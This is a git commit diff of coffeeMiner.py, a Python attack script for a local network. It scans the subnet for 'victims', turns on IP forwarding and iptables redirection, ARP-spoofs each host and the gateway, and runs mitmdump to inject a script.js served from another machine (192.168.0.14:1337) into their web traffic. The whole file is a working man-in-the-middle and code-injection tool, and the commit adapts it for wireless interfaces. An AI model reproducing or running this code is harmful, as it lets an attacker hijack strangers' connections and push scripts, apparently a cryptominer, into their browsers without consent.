2c22f7f992aa448e28b342abcf4de3cc0c831f49
Chase Taylor <x8@live.ca>
2018-01-08 23:01:29 -0700

    Tweaking SSLStrip

--- coffeeMiner.py
+++ coffeeMiner.py
@@ -1,11 +1,14 @@
 import subprocess, re, os, sys
 
 whitelist = 'whitelist.txt' # IP addresses not to target
-port = 8080 # port to redirect traffic to
+port = '8080' # port to redirect traffic to
 
-def get_victims():
+def get_victims(gateway):
     victims = []
-    ip_str = subprocess.check_output(['arp','-a']) # use arp -a to get connected devices
+    range = gateway.split('.')
+    del range[3]
+    range = '.'.join(range) + '.1-255'
+    ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use arp -a to get connected devices
     ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's
     
     if not os.path.isfile(whitelist):
@@ -13,11 +16,11 @@ def get_victims():
         print("No %s! Continuing...") % whitelist
     else:
         for ip in ip_list:
-            if not ip in open(whitelist).read():
+            if not ip in open(whitelist).read() and not ip == gateway:
                 #add ip to victim's list if it's not in whitelist.txt
                 victims.append(ip)
             else:
-                print("Skipping whitelisted ip %s") % ip
+                print("Skipping whitelisted ip " + ip)
         
     return victims
     
@@ -25,28 +28,31 @@ def get_victims():
 gateway = sys.argv[1]
 print("gateway: " + gateway)
 # get victims_ip
-victims = get_victims()
+victims = get_victims(gateway)
 print("victims: ")
 for v in victims:
     print(v)
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port)
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port " + port)
 
 
 # run the arpspoof for each victim, each one in a new console
 for victim in victims:
-    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
-    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
-    
-# run SSLStrip on port 8080
-os.system("xterm -hold -e 'python3 sslstrip2/sslstrip.py -l " + port + "' &")
+    os.system("xterm -e arpspoof -i wlan0 -t " + victim + " " + gateway + " &")
+    os.system("xterm -e arpspoof -i wlan0 -t " + gateway + " " + victim + " &")
 
 # start the http server for serving the script.js, in a new console
 os.system("xterm -hold -e 'python3 httpServer.py' &")
+print("HTTP Server Run")
+
+# run SSLStrip on port 8080
+#os.system("xterm -hold -e 'sudo sslstrip -l 8080' &")
+#print("SSLStrip Run")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
+os.system("~/.local/bin/mitmdump -s 'new_injector.py http://192.168.0.14:1337/script.js' -T")
+print("MITMProxy Run")
